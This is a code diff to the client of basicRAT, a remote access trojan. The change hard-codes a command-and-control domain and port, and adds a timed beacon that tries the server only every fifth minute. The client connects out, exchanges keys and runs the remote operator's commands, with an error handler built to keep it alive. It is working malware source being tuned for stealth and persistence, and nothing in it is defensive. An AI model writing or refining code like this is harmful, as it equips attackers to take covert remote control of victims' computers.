@@ -8,11 +8,12 @@
 import socket
 import sys
 import time
+import datetime
 
 from core import *
 
-
-# change these to suit your needs
+#Use localhost when testing locally
+#HOST = 'localhost'
 HOST = 'basicrat.sytes.net'
 PORT = 1337
 
@@ -55,31 +56,36 @@ def client_loop(conn, command_executor, dhkey):
         conn.send(crypto.encrypt(results, dhkey))
 
 
+def isTimeToTryServerConnection():
+    return datetime.datetime.now().minute % 5 == 0
+
 def main():
     exit_status = 0
 
     while True:
-        conn = socket.socket()
-        command_executor = toolkit.Toolkit(PLAT, conn)
+        if isTimeToTryServerConnection():
+            conn = socket.socket()
+            command_executor = toolkit.Toolkit(PLAT, conn)
 
-        try:
-            # attempt to connect to basicRAT server
-            conn.connect((HOST, PORT))
-        except socket.error:
-            time.sleep(CONN_TIMEOUT)
-            continue
+            try:
+                conn.connect((HOST, PORT))
 
-        dhkey = crypto.diffiehellman(conn)
+                # attempt to connect to basicRAT server
+            except socket.error:
+                time.sleep(CONN_TIMEOUT)
+                continue
 
-        # This try/except statement makes the client very resilient, but it's
-        # horrible for debugging. It will keep the client alive if the server
-        # is torn down unexpectedly, or if the client freaks out.
-        try:
-            exit_status = client_loop(conn, command_executor, dhkey)
-        except: pass
+            dhkey = crypto.diffiehellman(conn)
 
-        if exit_status:
-            sys.exit(0)
+            # This try/except statement makes the client very resilient, but it's
+            # horrible for debugging. It will keep the client alive if the server
+            # is torn down unexpectedly, or if the client freaks out.
+            try:
+                exit_status = client_loop(conn, command_executor, dhkey)
+            except: pass
+
+            if exit_status:
+                sys.exit(0)
 
 
 if __name__ == '__main__':
